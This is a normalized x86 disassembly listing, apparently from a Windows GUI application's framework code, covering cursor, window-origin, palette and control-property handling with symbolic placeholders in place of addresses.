mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
sub_444c78
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
mov ecx [ rw-data ]
mov si 0xffbe
call sub_40346c
mov ebx eax
sub_444cec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x2 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_444fb8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_444f46
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x1
mov eax [ rw-data ]
mov dl [ ebp - 0x1 ]
mov [ eax + 0x1c ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_443bb8
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403420
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4 ] 0x0
sete al
mov [ ebx + 0x6c ] al
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x10 ]
mov [ ebp - 0x6 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x18 ]
mov [ ebp - 0x6 ] edx
jmp r-xdata
mov [ ebp - 0x2 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
push ebp
call sub_444c78
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x2 ] 0x0
je r-xdata
mov al 0x1
call sub_4445a4
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_44ec90
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444f4d
mov eax [ rw-data ]
call sub_403270
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_45e10c
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x0
mov eax [ ebp - 0x6 ]
push eax
mov al [ ebp - 0x2 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xa ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_44790c
jmp r-xdata
mov edx [ eax + 0x220 ]
cmp edx [ ebx + 0x38 ]
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ rw-data ]
add edx 0xc
push edx
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
xchg edx eax
call sub_444470
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
xor edx edx
mov [ ebp - 0xa ] edx
xor edx edx
mov [ ebp - 0x6 ] edx
xor edx edx
call sub_461e70
sub_444f4d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4033fc
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_403270
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_4033fc
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
sub_444fdc
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_443644
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_445010
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_444fdc
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax ebp
call sub_4462a8
lea edx [ esp + 0x4 ]
mov ecx ebx
mov eax ebp
call sub_44a940
test eax eax
je r-xdata
mov esi eax
sub_445058
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_4183f4
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebx ] eax
sub_445080
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_4186ec
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_403270
xor eax eax
mov [ ebx ] eax
sub_4450a0
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_4450d0
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_418914
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_445180
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418978
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_445159
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_44530c
call sub_403ad0
call sub_403ad0
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_418550
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_4249bc
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_44518c
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_418914
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44522a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445231
mov eax [ rw-data ]
call sub_418978
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_445202
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_44530c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_424a18
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_418550
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_4249bc
test al al
je r-xdata
sub_445238
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov eax esi
call sub_44530c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4242f8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_445264
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_424b9c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_424ba0
mov eax [ ebp - 0x4 ]
call sub_445358
mov eax [ rw-data ]
call sub_418914
mov ebx eax
xor eax eax
push ebp
push sub_4452e9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4183f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418978
retn
call sub_4450d0
sub_44530c
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_424ba0
mov edx ebx
mov eax [ rw-data ]
call sub_418928
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_445358
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_446d9c
test al al
je r-xdata
and [ ebx + 0x54 ] 0xffffff7f
or [ ebx + 0x54 ] 0x80
jmp r-xdata
sub_445384
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403240
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_4453c0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_418c30
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_445408
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_4454c4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_445591
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445598
lea eax [ ebp - 0x1c ]
call sub_403fe8
lea eax [ ebp - 0x8 ]
call sub_403fe8
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_40346c
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
mov ax [ eax + 0x84 ]
call sub_455d40
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408da8
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_40403c
sub_4455b4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_44561b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_452e0c
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_446764
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403420
mov edx [ eax + 0x64 ]
pop eax
call sub_4043f4
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445622
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
mov al 0x1
sub_445628
push ebx
mov ebx eax
mov eax ebx
call sub_452e34
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403420
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44565c
push ebx
mov ebx eax
mov eax ebx
call sub_452e84
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403420
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x80 ]
call sub_4043f4
je r-xdata
mov al 0x1
pop ebx
retn
sub_445694
push ebx
mov ebx eax
mov eax ebx
call sub_452ec0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403420
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4456c8
push ebx
mov ebx eax
mov eax ebx
call sub_42115c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x120 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4456f0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_446794
sub_445710
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_445730
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x80
mov edx esi
call sub_40403c
sub_445754
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_446684
sub_445774
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x120 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x124 ] edx
sub_4457a0
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403420
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x158 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403420
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x154 ]
call sub_4043f4
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403420
mov al [ edi + 0x70 ]
cmp al [ esi + 0x150 ]
je r-xdata
mov al 0x1
sub_445804
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_4460e0
sub_445824
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_4460cc
sub_445844
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x150 ] bl
sub_445864
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_42086c
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423744
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_446814
mov al [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_445384
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_4476cc
mov [ ebx + 0x70 ] 0xff000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x9a ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7a ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x150 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_44593c
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_403624
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_465d88
mov eax [ edi + 0xa0 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40360c
push edi
xor ecx ecx
mov edx 0xb039
call sub_44790c
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx esp
mov eax edi
call sub_446104
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_40346c
xor eax eax
mov [ edi + 0xa0 ] eax
jmp r-xdata
mov eax [ edi + 0x6c ]
call sub_403270
xor eax eax
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x74 ]
call sub_403270
mov eax [ edi + 0x68 ]
call sub_403270
mov eax [ edi + 0x64 ]
call sub_408918
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4208b8
test bl bl
jle r-xdata
sub_445a08
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_445a30
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov ebp eax
xor ebx ebx
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov si 0xffd7
call sub_40346c
mov edi eax
test edi edi
je r-xdata
lea edx [ esp + 0x4 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
mov al [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push edi
push esi
call SelectPalette
mov edi eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push edi
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax ebp
mov edx [ eax ]
call [ edx + 0x7c ]
sub_445ab8
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x61 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x61 ] al
mov eax ebx
call sub_445db8
sub_445ad8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
call sub_403270
xor eax eax
mov [ ebx + 0x6c ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x6c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_448728
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_40346c
mov edx ebx
mov eax edi
call sub_42093c
mov eax ebx
mov si 0xffd9
call sub_40346c
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x6c ] eax
pop edi
pop esi
pop ebx
retn
sub_445ba0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_420ccc
and [ ebx + 0x54 ] 0xfff7
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_44790c
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_44790c
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_44790c
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_44790c
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_44790c
sub_445c34
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_420b88
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x7c ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_44671c
jmp r-xdata
xor edx edx
mov eax esi
call sub_445ad8
sub_445c78
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
mov al [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov si 0xffd0
call sub_40346c
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
xor eax eax
mov al bl
mov dl [ eax + rw-data ]
mov eax edi
call sub_445ab8
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
mov al [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
mov eax edi
mov si 0xffee
call sub_40346c
mov al [ esp ]
test al al
je r-xdata
sub al 0x5
je r-xdata
test bl bl
je r-xdata
sub bl 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_445d20
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax ebx
call sub_447e9c
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp esi [ ebx + 0x40 ]
jne r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_446bac
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_445db8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax ebx
call sub_44790c
mov eax ebx
mov si 0xffd0
call sub_40346c
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov eax ebx
mov si 0xffcf
call sub_40346c
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
sub_445db8
push ebx
push esi
add esp 0xfffffff0
mov esi eax
cmp [ esi + 0x62 ] 0x0
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
mov bl [ esi + 0x61 ]
mov al [ r-xdata ]
cmp al bl
jne r-xdata
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x90 ] eax
xor eax eax
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
adc eax 0x0
mov eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
